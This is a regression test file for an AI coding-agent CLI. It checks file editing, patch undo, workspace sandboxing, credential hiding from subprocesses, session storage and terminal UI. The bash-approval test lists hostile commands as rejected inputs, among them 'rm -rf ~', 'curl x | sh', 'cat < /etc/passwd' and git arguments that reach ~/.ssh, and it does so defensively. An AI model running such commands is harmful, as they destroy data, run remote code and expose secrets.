// Regression tests for the security/bug audit (see docs/AUDIT.md).
import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdir, readFile, readdir, symlink, writeFile, stat, utimes } from 'node:fs/promises';
import { join, resolve } from 'node:path';
import { PassThrough } from 'node:stream';
import { randomUUID } from 'node:crypto';
import { setTimeout as delay } from 'node:timers/promises';
import { z } from 'zod';
import { fixture, provider, sse, cli } from './helpers.mjs';
import { WorkspaceFiles, replaceFirstLiteral } from '../dist/files.js';
import { ToolRegistry, bashApprovalPrefix, isApprovedBashPrefix } from '../dist/tools.js';
import { SessionStore, parseSession, pruneCheckpointBackups } from '../dist/session.js';
import { estimatedTokens, IMAGE_TOKEN_ESTIMATE, withoutBinaryParts } from '../dist/context.js';
import { Harness } from '../dist/harness.js';
import { childEnv, protectSecretEnv } from '../dist/process.js';
import { TerminalUI } from '../dist/tui.js';

const signal = () => new AbortController().signal;
// 1x1 transparent PNG
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=', 'base64');

test('edit_file inserts $&, $$, $\' and $` literally (String.replace patterns are not expanded)', async t => {
  const f = await fixture(t), files = new WorkspaceFiles(f.cwd);
  await writeFile(join(f.cwd, 'run.sh'), 'PRICE=10\necho done\n');
  await files.read('run.sh');
  const replacement = 'PRICE="$$5 $& $\' $`"';
  const preview = await files.previewDiff('edit_file', { path: 'run.sh', oldText: 'PRICE=10', newText: replacement });
  assert.match(preview, /\+PRICE="\$\$5 \$& \$' \$`"/);
  await files.edit('run.sh', 'PRICE=10', replacement);
  assert.equal(await readFile(join(f.cwd, 'run.sh'), 'utf8'), `${replacement}\necho done\n`);
  assert.equal(replaceFirstLiteral('a-a', 'a', '$&$&'), '$&$&-a');
});

test('apply_patch honours Move to, chains repeated updates of one file and validates before writing', async t => {
  const f = await fixture(t), files = new WorkspaceFiles(f.cwd);
  await writeFile(join(f.cwd, 'old.txt'), 'one\ntwo\nthree\n');
  await writeFile(join(f.cwd, 'twice.txt'), 'a\nb\nc\n');
  files.beginTurn();
  const summary = await files.applyPatch([
    '*** Begin Patch',
    '*** Update File: old.txt',
    '*** Move to: moved/new.txt',
    '@@',
    ' one',
    '-two',
    '+TWO',
    '*** Update File: twice.txt',
    '@@',
    '-a',
    '+A',
    '*** Update File: twice.txt',
    '@@',
    '-c',
    '+C',
    '*** Add File: fresh.txt',
    '+first',
    '+second',
    '',
    '*** End Patch',
  ].join('\n'));
  assert.match(summary, /Moved old\.txt -> moved\/new\.txt/);
  await assert.rejects(readFile(join(f.cwd, 'old.txt')));
  assert.equal(await readFile(join(f.cwd, 'moved/new.txt'), 'utf8'), 'one\nTWO\nthree\n');
  assert.equal(await readFile(join(f.cwd, 'twice.txt'), 'utf8'), 'A\nb\nC\n');
  assert.equal(await readFile(join(f.cwd, 'fresh.txt'), 'utf8'), 'first\nsecond\n');

  // Undo restores the moved source and removes the destination.
  const backups = files.takeTurnBackups();
  const restored = await files.restoreBackups(backups);
  assert.equal(await readFile(join(f.cwd, 'old.txt'), 'utf8'), 'one\ntwo\nthree\n');
  assert(restored.deleted.includes('moved/new.txt'));

  // A patch with one bad hunk changes nothing at all.
  await assert.rejects(files.applyPatch([
    '*** Begin Patch',
    '*** Update File: twice.txt',
    '@@',
    '-a',
    '+changed',
    '*** Update File: twice.txt',
    '@@',
    '-does-not-exist',
    '+x',
    '*** End Patch',
  ].join('\n')), /Failed to match/);
  assert.equal(await readFile(join(f.cwd, 'twice.txt'), 'utf8'), 'a\nb\nc\n');
});

test('reverting never overwrites a file the user changed after the agent turn unless forced', async t => {
  const f = await fixture(t), files = new WorkspaceFiles(f.cwd);
  await writeFile(join(f.cwd, 'app.ts'), 'original\n');
  files.beginTurn();
  await files.read('app.ts');
  await files.write('app.ts', 'agent version\n');
  const backups = files.takeTurnBackups();
  await writeFile(join(f.cwd, 'app.ts'), 'user kept editing\n');
  const result = await files.restoreBackups(backups);
  assert.deepEqual(result.conflicts, ['app.ts']);
  assert.equal(await readFile(join(f.cwd, 'app.ts'), 'utf8'), 'user kept editing\n');
  const forced = await files.restoreBackups(backups, { force: true });
  assert.deepEqual(forced.restored, ['app.ts']);
  assert.equal(await readFile(join(f.cwd, 'app.ts'), 'utf8'), 'original\n');
});

test('model-initiated image reads outside the workspace require approval; workspace images do not', async t => {
  const f = await fixture(t);
  await writeFile(join(f.cwd, 'in.png'), PNG);
  const outside = join(f.root, 'private.png');
  await writeFile(outside, PNG);
  await symlink(outside, join(f.cwd, 'link.png'));
  const requests = [];
  const registry = new ToolRegistry(f.cwd, async request => { requests.push(request); return false; });
  const ok = await registry.execute({ toolCallId: '1', toolName: 'view_image', input: { path: 'in.png' } }, signal());
  assert.match(ok.text, /Attached image/);
  assert.equal(requests.length, 0);
  for (const path of [outside, '../private.png', 'link.png']) {
    const denied = await registry.execute({ toolCallId: '2', toolName: 'view_image', input: { path } }, signal());
    assert.equal(denied.denied, true, path);
  }
  assert.equal(requests.length, 3);
  assert(requests.every(r => r.tool === 'view_image' && r.input.outsideWorkspace === true));
  // A file merely named *.png must also really be an image path after symlink resolution.
  await writeFile(join(f.root, 'secret.txt'), 'top secret');
  await symlink(join(f.root, 'secret.txt'), join(f.cwd, 'trick.png'));
  const files = new WorkspaceFiles(f.cwd);
  await assert.rejects(files.readImage('trick.png', undefined, { allowOutside: true }), /Unsupported image/);
});

test('tools hidden in the current mode cannot be executed by name', async t => {
  const f = await fixture(t);
  const registry = new ToolRegistry(f.cwd, async () => true, true);
  assert(!Object.keys(registry.schemas()).includes('view_image'));
  await assert.rejects(registry.execute({ toolCallId: '1', toolName: 'view_image', input: { path: 'x.png' } }, signal()), /not available/);
  await assert.rejects(registry.execute({ toolCallId: '2', toolName: 'write_file', input: { path: 'a', content: 'b' } }, signal()), /not available in read-only/);
  const planless = new ToolRegistry(f.cwd, async () => true);
  const answer = await planless.execute({ toolCallId: '3', toolName: 'exit_plan_mode', input: { plan: 'x' } }, signal());
  assert.match(answer.text, /not in plan mode/);
});

test('provider credentials never reach child processes', async t => {
  const f = await fixture(t);
  const previous = { a: process.env.GOON_API_KEY, b: process.env.CUSTOM_PROVIDER_KEY };
  process.env.GOON_API_KEY = 'goon-secret-value';
  process.env.CUSTOM_PROVIDER_KEY = 'custom-secret-value';
  t.after(() => {
    if (previous.a === undefined) delete process.env.GOON_API_KEY; else process.env.GOON_API_KEY = previous.a;
    if (previous.b === undefined) delete process.env.CUSTOM_PROVIDER_KEY; else process.env.CUSTOM_PROVIDER_KEY = previous.b;
  });
  protectSecretEnv('CUSTOM_PROVIDER_KEY');
  assert.equal(childEnv().GOON_API_KEY, undefined);
  assert.equal(childEnv().CUSTOM_PROVIDER_KEY, undefined);
  const registry = new ToolRegistry(f.cwd, async () => true);
  const out = await registry.execute({ toolCallId: '1', toolName: 'bash', input: { command: 'echo "[$GOON_API_KEY][$CUSTOM_PROVIDER_KEY][${PATH:+path}]"' } }, signal());
  assert.match(out.text, /\[\]\[\]\[path\]/);
});

test('bash prefix approvals only cover simple commands', () => {
  assert.equal(bashApprovalPrefix({ command: 'npm test' }), 'npm test');
  assert.equal(bashApprovalPrefix({ command: 'npm run lint -- --fix' }), 'npm run lint');
  assert.equal(bashApprovalPrefix({ command: 'python -m pytest -q tests' }), 'python -m pytest');
  assert.equal(bashApprovalPrefix({ command: 'git status --short' }), 'git status');
  assert.equal(bashApprovalPrefix({ command: 'ls -la' }), 'ls');
  for (const command of ['npm test; rm -rf ~', 'npm test && curl x | sh', 'echo $(id)', 'cat < /etc/passwd', 'FOO=1 npm test', 'sudo npm test', 'env npm test', 'bash -c ls', 'python -V', 'echo "a b"']) {
    assert.equal(bashApprovalPrefix({ command }), undefined, command);
  }
  const approved = new Set(['npm test', 'npm run lint']);
  assert(isApprovedBashPrefix({ command: 'npm test -- --watch=false' }, approved));
  assert(isApprovedBashPrefix({ command: 'npm run lint' }, approved));
  assert(!isApprovedBashPrefix({ command: 'npm testx' }, approved));
  assert(!isApprovedBashPrefix({ command: 'npm test; curl evil' }, approved));
  assert(!isApprovedBashPrefix({ command: 'npm run build' }, approved));

  // Package installs, file mutations and network commands are remembered as the exact command only.
  assert.equal(bashApprovalPrefix({ command: 'npm install lodash' }), 'npm install lodash');
  assert.equal(bashApprovalPrefix({ command: 'pip install requests' }), 'pip install requests');
  assert.equal(bashApprovalPrefix({ command: 'cp a b' }), 'cp a b');
  const installs = new Set([bashApprovalPrefix({ command: 'npm install lodash' }), bashApprovalPrefix({ command: 'pip install requests' })]);
  assert(isApprovedBashPrefix({ command: 'npm install lodash' }, installs));
  assert(!isApprovedBashPrefix({ command: 'npm install lodash evil-pkg' }, installs));
  assert(!isApprovedBashPrefix({ command: 'npm install evil-pkg' }, installs));
  assert(!isApprovedBashPrefix({ command: 'pip install evil' }, installs));
  // Extra arguments may not leave the workspace or switch on write/exec options.
  const git = new Set([bashApprovalPrefix({ command: 'git diff' })]);
  assert(isApprovedBashPrefix({ command: 'git diff --stat src' }, git));
  for (const command of ['git diff --output=/tmp/x', 'git diff --ext-diff', 'git diff -c core.pager=x', 'git diff ../other-repo', 'git diff ~/.ssh']) {
    assert(!isApprovedBashPrefix({ command }, git), command);
  }
  assert.equal(bashApprovalPrefix({ command: 'cat /etc/passwd' }), undefined);
});

test('images are estimated as a flat token cost, stored as base64 and legacy sessions are repaired', async t => {
  const big = Buffer.alloc(400_000, 7);
  const message = { role: 'user', content: [{ type: 'text', text: 'look' }, { type: 'image', image: big.toString('base64'), mediaType: 'image/png' }] };
  const estimate = estimatedTokens([message], '');
  assert(estimate < IMAGE_TOKEN_ESTIMATE + 200, `estimate ${estimate}`);
  const legacyBuffer = { role: 'user', content: [{ type: 'image', image: big, mediaType: 'image/png' }] };
  assert(estimatedTokens([legacyBuffer], '') < IMAGE_TOKEN_ESTIMATE + 200);
  assert.deepEqual(withoutBinaryParts([message])[0].content[1], { type: 'text', text: '[image attachment omitted]' });

  // A session written by older versions (Buffer serialized by JSON) lists and resumes again.
  const f = await fixture(t);
  const root = join(f.data, 'sessions');
  await mkdir(root, { recursive: true });
  const id = randomUUID();
  const now = new Date().toISOString();
  const legacy = {
    version: 1, id, cwd: f.cwd, createdAt: now, updatedAt: now, provider: 'openai-compatible', model: 'm', baseUrl: 'http://x',
    messages: [
      { role: 'user', content: [{ type: 'text', text: 'what is this' }, { type: 'image', image: { type: 'Buffer', data: [...PNG] }, mediaType: 'image/png' }] },
      { role: 'user', content: [{ type: 'image', image: { 0: 137, 1: 80, 2: 78 }, mediaType: 'image/png' }] },
    ],
    tokens: 0, compactions: 0,
  };
  await writeFile(join(root, `${id}.json`), JSON.stringify(legacy));
  const parsed = parseSession(JSON.stringify(legacy));
  assert.equal(parsed.messages[0].content[1].image, PNG.toString('base64'));
  assert.equal(parsed.messages[1].content[0].image, Buffer.from([137, 80, 78]).toString('base64'));
  assert.deepEqual((await SessionStore.list(root)).map(s => s.id), [id]);
  const store = await SessionStore.open(root, { cwd: f.cwd, provider: 'openai-compatible', model: 'm', baseUrl: 'http://x' }, id);
  assert.equal(store.session.messages.length, 2);
  await store.close();
});

test('a real image attachment is sent once as base64 and does not trigger compaction', async t => {
  const f = await fixture(t);
  // 300 KB image: as a numeric JSON array it used to count as ~500k tokens.
  const image = Buffer.concat([PNG, Buffer.alloc(300_000, 1)]);
  await writeFile(join(f.cwd, 'shot.png'), image);
  const p = await provider(t, (body, response) => {
    const content = body.messages.find(m => m.role === 'user').content;
    assert(Array.isArray(content));
    const part = content.find(c => c.type === 'image_url');
    assert(part.image_url.url.startsWith('data:image/png;base64,'));
    sse(response, { text: 'An image.' });
  });
  const result = await cli(f, p.url, ['--json', '-p', 'describe @shot.png'], { env: {} }).done;
  assert.equal(result.code, 0, result.stderr + result.stdout);
  assert.equal(p.requests.length, 1, 'no compaction request');
  const events = result.stdout.trim().split('\n').map(line => JSON.parse(line));
  const id = events[0].id;
  const raw = await readFile(join(f.data, 'goon/sessions', `${id}.json`), 'utf8');
  assert(raw.length < image.length * 1.5, `session file is ${raw.length} bytes`);
  const resumed = await cli(f, p.url, ['--json', '--resume', id, '-p', 'again']).done;
  assert.equal(resumed.code, 0, resumed.stderr);
});

test('deleting sessions refuses ambiguous prefixes and sessions open in another process', async t => {
  const f = await fixture(t);
  const root = join(f.data, 'sessions');
  const route = { cwd: f.cwd, provider: 'openai-compatible', model: 'm', baseUrl: 'http://x' };
  const a = await SessionStore.open(root, route);
  a.session.messages.push({ role: 'user', content: 'a' });
  await a.save();
  const b = await SessionStore.open(root, route);
  b.session.messages.push({ role: 'user', content: 'b' });
  await b.save();
  await b.close();
  // Session a is locked by a live process (this one): deleting it must be refused.
  await assert.rejects(SessionStore.deleteSession(root, a.session.id), /open in another goon process/);
  await writeFile(join(root, `${a.session.id}.lock`), String(process.ppid));
  await assert.rejects(SessionStore.deleteSession(root, a.session.id), /open in another goon process/);
  // An empty prefix-of-both is ambiguous when both ids share it.
  const common = (() => { let i = 0; while (a.session.id[i] === b.session.id[i]) i++; return a.session.id.slice(0, i); })();
  if (common.length > 0) await assert.rejects(SessionStore.deleteSession(root, common), /ambiguous/);
  assert.equal(await SessionStore.deleteSession(root, b.session.id), b.session.id);
  await writeFile(join(root, `${a.session.id}.lock`), String(process.pid));
  await a.close();
});

test('session listings use the summary index and notice rewritten files', async t => {
  const f = await fixture(t);
  const root = join(f.data, 'sessions');
  const route = { cwd: f.cwd, provider: 'openai-compatible', model: 'm', baseUrl: 'http://x' };
  const store = await SessionStore.open(root, route);
  store.session.messages.push({ role: 'user', content: 'first prompt' });
  await store.save();
  const file = join(root, `${store.session.id}.json`);
  const old = new Date(Date.now() - 60_000);
  await utimes(file, old, old);
  assert.equal((await SessionStore.list(root))[0].preview, 'first prompt');
  assert((await readdir(root)).includes('.index.json'));
  // Rewrite with the same mtime but different size: the index must not serve the stale entry.
  const session = JSON.parse(await readFile(file, 'utf8'));
  session.messages.push({ role: 'user', content: 'second' });
  await writeFile(file, JSON.stringify(session));
  await utimes(file, old, old);
  assert.equal((await SessionStore.list(root))[0].messagesCount, 2);
  await store.close();
});

test('checkpoint backups are bounded; pruned backups are reported, not silently skipped', () => {
  const content = 'x'.repeat(1000);
  const session = { checkpoints: Array.from({ length: 10 }, (_, i) => ({ id: i + 1, files: [{ path: `f${i}`, existed: true, content }] })) };
  const pruned = pruneCheckpointBackups(session, 4500);
  assert.equal(pruned, 6);
  assert(session.checkpoints.slice(0, 6).every(cp => cp.files[0].pruned && cp.files[0].content === undefined));
  assert(session.checkpoints.slice(6).every(cp => cp.files[0].content === content));
});

test('context messages added during a run wait for a safe point after tool results', async t => {
  const f = await fixture(t);
  let harness;
  const p = await provider(t, (body, response, n) => {
    if (n === 1) return sse(response, { calls: [{ id: 'slow1', name: 'slow', input: {} }] });
    const roles = body.messages.map(m => m.role);
    const toolIdx = roles.indexOf('tool');
    assert(toolIdx > 0 && roles[toolIdx - 1] === 'assistant', JSON.stringify(roles));
    assert.equal(roles[toolIdx + 1], 'user');
    assert.match(JSON.stringify(body.messages[toolIdx + 1]), /shell output/);
    sse(response, { text: 'done' });
  });
  const config = { cwd: f.cwd, provider: 'openai-compatible', model: 'test-model', baseUrl: p.url, apiKey: 'fake', contextWindow: 128000, maxOutputTokens: 8192, timeoutMs: 5000, runTokenBudget: 0, inlineReasoning: 'leading-think', showReasoning: false };
  const store = await SessionStore.open(join(f.root, 'sessions'), config);
  t.after(() => store.close());
  const registry = new ToolRegistry(f.cwd, async () => true);
  registry.register('slow', { description: 'slow', schema: z.object({}), readOnly: true, execute: async () => {
    harness.addContextMessage({ role: 'user', content: 'shell output arrived mid-turn' });
    await delay(20);
    return 'ok';
  } });
  harness = new Harness(config, store, registry);
  assert.equal(await harness.run('go', signal()), 'done');
});

test('auxiliary calls send a low effort and the override header never leaves the process', async t => {
  const f = await fixture(t);
  const seen = [];
  const p = await provider(t, (body, response, n, request) => {
    seen.push({ effort: body.reasoning_effort, header: request.headers['x-goon-effort'] });
    sse(response, { text: n === 1 ? 'main answer' : 'side answer' });
  });
  const config = { cwd: f.cwd, provider: 'openai-compatible', model: 'test-model', baseUrl: p.url, apiKey: 'fake', effort: 'max', contextWindow: 128000, maxOutputTokens: 8192, timeoutMs: 5000, runTokenBudget: 0, inlineReasoning: 'leading-think', showReasoning: false };
  const store = await SessionStore.open(join(f.root, 'sessions'), config);
  t.after(() => store.close());
  const harness = new Harness(config, store, new ToolRegistry(f.cwd, async () => true));
  await harness.run('hello', signal());
  await harness.askSideQuestion('quick?', signal());
  assert.deepEqual(seen, [{ effort: 'max', header: undefined }, { effort: 'low', header: undefined }]);
});

test('Retry-After from a 429 is honoured before retrying', async t => {
  const f = await fixture(t);
  let attempts = 0;
  const p = await provider(t, (_, response) => {
    attempts++;
    if (attempts === 1) {
      response.writeHead(429, { 'content-type': 'application/json', 'retry-after': '0.4' });
      response.end(JSON.stringify({ error: { message: 'slow down' } }));
      return;
    }
    sse(response, { text: 'ok' });
  });
  const config = { cwd: f.cwd, provider: 'openai-compatible', model: 'test-model', baseUrl: p.url, apiKey: 'fake', contextWindow: 128000, maxOutputTokens: 8192, timeoutMs: 5000, runTokenBudget: 0, inlineReasoning: 'leading-think', showReasoning: false };
  const store = await SessionStore.open(join(f.root, 'sessions'), config);
  t.after(() => store.close());
  const started = Date.now();
  assert.equal(await new Harness(config, store, new ToolRegistry(f.cwd, async () => true)).run('x', signal()), 'ok');
  assert(Date.now() - started >= 380, `retried after ${Date.now() - started} ms`);
  assert.equal(attempts, 2);
});

test('TUI: switching to auto while an approval is pending approves once, never "always"', async t => {
  const input = new PassThrough(), output = new PassThrough();
  input.isRaw = false; input.setRawMode = value => { input.isRaw = value; };
  output.columns = 60; output.rows = 20; output.on('data', () => {});
  const ui = new TerminalUI('m', () => {}, input, output);
  t.after(() => ui.close());
  const answer = ui.askTransient('Allow bash?', '[y/N/a(lways)] ');
  ui.setMode('auto');
  assert.equal(await answer, 'y');
});

test('TUI masked questions never render the typed secret', async t => {
  const input = new PassThrough(), output = new PassThrough();
  input.isRaw = false; input.setRawMode = value => { input.isRaw = value; };
  output.columns = 60; output.rows = 20;
  let written = '';
  output.on('data', chunk => { written += chunk; });
  const ui = new TerminalUI('m', () => {}, input, output);
  t.after(() => ui.close());
  const answer = ui.question('API Key: ', undefined, false, { mask: true });
  for (const ch of 'sk-super-secret') input.emit('keypress', ch, { name: ch });
  await delay(40);
  assert(!written.includes('sk-super-secret'));
  assert(ui.renderedFrame().includes('•'.repeat(5)));
  input.emit('keypress', '\r', { name: 'return' });
  assert.equal(await answer, 'sk-super-secret');
});

test('TUI incremental rendering is identical to a full re-render', async t => {
  const input = new PassThrough(), output = new PassThrough();
  input.isRaw = false; input.setRawMode = value => { input.isRaw = value; };
  output.columns = 70; output.rows = 24; output.on('data', () => {});
  const ui = new TerminalUI('m', () => {}, input, output);
  t.after(() => ui.close());
  const pieces = ['Hello **bold** ', '\n', '- item\n', '```ts\nconst a = 1;\n', '```\n', '| a | bb |\n', '|---|---|\n', '| ccc | d |\n', '> quote\n', '# Title\n', 'tiếng Việt 中文 😀 ', 'word '.repeat(20)];
  let seed = 7;
  const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
  for (let step = 0; step < 600; step++) {
    const r = rnd();
    if (r < 0.6) ui.event({ type: 'text', text: pieces[Math.floor(rnd() * pieces.length)] });
    else if (r < 0.7) ui.event({ type: 'reasoning', text: 'thinking ' + pieces[Math.floor(rnd() * pieces.length)], source: 'provider' });
    else if (r < 0.8) ui.event({ type: 'tool', name: 'edit_file', id: `e${step}`, state: 'done', meta: { kind: 'edit', summary: 'a.ts', diff: '--- a/a.ts\n+++ b/a.ts\n@@ -1,2 +1,2 @@\n-x\n+y\n z', added: 1, removed: 1 } });
    else if (r < 0.88) ui.write(`\n> prompt ${step}\n`);
    else if (r < 0.92) ui.setViewMode(rnd() < 0.5 ? 'normal' : 'verbose');
    else output.columns = 40 + Math.floor(rnd() * 60);
    const cols = output.columns - 1;
    const incremental = ui.renderStyledBodyLines(cols, true);
    const cached = ui.bodyCache;
    ui.bodyCache = undefined;
    assert.deepEqual(incremental, ui.renderStyledBodyLines(cols, true), `step ${step}`);
    ui.bodyCache = cached;
  }
});

test('setup wizard always offers the model step and hides the API key', async t => {
  const { runSetupWizard } = await import('../dist/index.js');
  const f = await fixture(t);
  const oldConfigHome = process.env.XDG_CONFIG_HOME;
  process.env.XDG_CONFIG_HOME = f.config;
  t.after(() => { if (oldConfigHome === undefined) delete process.env.XDG_CONFIG_HOME; else process.env.XDG_CONFIG_HOME = oldConfigHome; });
  const asked = [], secret = [];
  const answers = ['4', '', '2', ''];
  const updated = await runSetupWizard({ provider: 'openai-compatible', model: 'old-model', keyEnv: 'GOON_TEST_UNUSED_KEY', contextWindow: 128000, maxOutputTokens: 16384, timeoutMs: 300000, runTokenBudget: 0, inlineReasoning: 'leading-think', showReasoning: false }, {
    write: () => {},
    ask: async label => { asked.push(label); return answers.shift() ?? ''; },
    askSecret: async label => { secret.push(label); return 'sk-hidden'; },
    discover: async () => [{ id: 'new-model-a' }, { id: 'new-model-b' }],
  });
  assert.equal(updated.model, 'new-model-b');
  assert(asked.some(label => /model/i.test(label)));
  assert.equal(secret.length, 1);
  assert(!asked.some(label => /API Key/i.test(label)));
});

test('real TUI: approvals come back after switching from --yes (auto) to ask mode', async t => {
  if (process.platform === 'win32') { t.skip('POSIX pseudo-terminal test'); return; }
  const { spawn } = await import('node:child_process');
  const f = await fixture(t);
  const p = await provider(t, (_, response, n) => n === 1 ? sse(response, {
    calls: [{ id: 'w1', name: 'write_file', input: { path: 'guarded.txt', content: 'should need approval' } }],
  }) : sse(response, { text: 'Finished.' }));
  const child = spawn('python3', [resolve('tests/fixtures/terminal-mode-switch.py'), process.execPath, resolve(process.env.GOON_TEST_BIN ?? 'bin/goon.mjs'),
    '--cwd', f.cwd, '--model', 'test-model', '--base-url', p.url, '--yes'], {
    env: { ...process.env, GOON_API_KEY: 'tui-test-key', XDG_CONFIG_HOME: f.config, XDG_DATA_HOME: f.data, GOON_NOTIFY: '0' },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  t.after(() => child.kill('SIGKILL'));
  let stdout = '', stderr = '';
  child.stdout.on('data', c => { stdout += c; }); child.stderr.on('data', c => { stderr += c; });
  const code = await new Promise((resolve, reject) => { child.on('error', reject); child.on('close', resolve); });
  assert.equal(code, 0, stderr + stdout);
  assert.deepEqual(JSON.parse(stdout), { code: 0, asked: true });
  await assert.rejects(stat(join(f.cwd, 'guarded.txt')), 'denied write must not happen');
});

test('TUI picker: tabs switch with ←/→ and Tab, ↑/↓ select, typing filters, Enter picks, Esc cancels', async t => {
  const { stripVTControlCharacters } = await import('node:util');
  const input = new PassThrough(), output = new PassThrough();
  input.isRaw = false; input.setRawMode = value => { input.isRaw = value; };
  output.columns = 90; output.rows = 24; output.on('data', () => {});
  const ui = new TerminalUI('m', () => {}, input, output);
  t.after(() => ui.close());
  const key = (text, name, extra = {}) => input.emit('keypress', text, { name, ...extra });
  const tabs = [
    { label: 'This folder', items: [{ id: 'a', label: 'fix checkout', meta: '2h' }, { id: 'b', label: 'add retry', meta: '1d' }] },
    { label: 'All projects', items: [{ id: 'c', label: 'docs site', meta: 'web   3d' }, { id: 'd', label: 'billing bug', meta: 'api   4d', detail: '/home/dev/api' }] },
  ];
  let picking = ui.pick('Resume', tabs, { action: 'resume' });
  await delay(20);
  let frame = stripVTControlCharacters(ui.renderedFrame());
  assert.match(frame, /Resume {3}This folder 2 {3}All projects 2/);
  assert.match(frame, /› fix checkout/);
  assert.match(frame, /enter resume {3}esc cancel/);
  key('', 'down');
  key('\r', 'return');
  assert.equal((await picking).item.id, 'b');

  picking = ui.pick('Resume', tabs);
  key('', 'right');
  key('', 'down');
  await delay(20);
  frame = stripVTControlCharacters(ui.renderedFrame());
  assert.match(frame, /› billing bug\s+api {3}4d/);
  assert.match(frame, /\/home\/dev\/api/, 'detail of the selected row is shown');
  key('', 'tab'); // wraps back to the first tab
  key('', 'left'); // and left goes back to All projects
  for (const ch of 'docs') key(ch, ch);
  await delay(20);
  frame = stripVTControlCharacters(ui.renderedFrame());
  assert.match(frame, /All projects 1/);
  assert.match(frame, /› docs/);
  key('\r', 'return');
  const chosen = await picking;
  assert.deepEqual([chosen.tab, chosen.item.id], [1, 'c']);

  picking = ui.pick('Resume', tabs);
  key('', 'escape');
  assert.equal(await picking, undefined);
  assert.equal(ui.isPicking(), false);
});

test('resuming a session by ID or with `goon resume` from another folder switches to its workspace', async t => {
  const { spawn } = await import('node:child_process');
  const { realpath } = await import('node:fs/promises');
  const f = await fixture(t);
  const p = await provider(t, (_, response) => sse(response, { text: 'ok' }));
  const first = await cli(f, p.url, ['--json', '-p', 'start work']).done;
  assert.equal(first.code, 0, first.stderr);
  const id = JSON.parse(first.stdout.split('\n')[0]).id;
  const elsewhere = join(f.root, 'elsewhere');
  await mkdir(elsewhere);
  const run = (args, input = '') => new Promise((resolveRun, reject) => {
    const child = spawn(process.execPath, [resolve(process.env.GOON_TEST_BIN ?? 'bin/goon.mjs'), '--base-url', p.url, '--model', 'test-model', ...args], {
      cwd: elsewhere,
      env: { ...process.env, XDG_CONFIG_HOME: f.config, XDG_DATA_HOME: f.data, GOON_API_KEY: 'k' },
      stdio: ['pipe', 'pipe', 'pipe'],
    });
    let stdout = '', stderr = '';
    child.stdout.on('data', c => { stdout += c; });
    child.stderr.on('data', c => { stderr += c; });
    child.on('error', reject);
    child.on('close', code => resolveRun({ code, stdout, stderr }));
    child.stdin.end(input);
  });
  const byId = await run(['--json', '--resume', id.slice(0, 8), '-p', 'continue']);
  assert.equal(byId.code, 0, byId.stderr);
  const started = JSON.parse(byId.stdout.split('\n')[0]);
  assert.equal(started.id, id);
  assert.equal(started.cwd, await realpath(f.cwd));
  // `goon resume` with a single saved session resumes it directly, whatever the current folder.
  const plain = await run(['--json', 'resume'], 'one more');
  assert.equal(plain.code, 0, plain.stderr);
  assert.equal(JSON.parse(plain.stdout.split('\n')[0]).id, id);
});
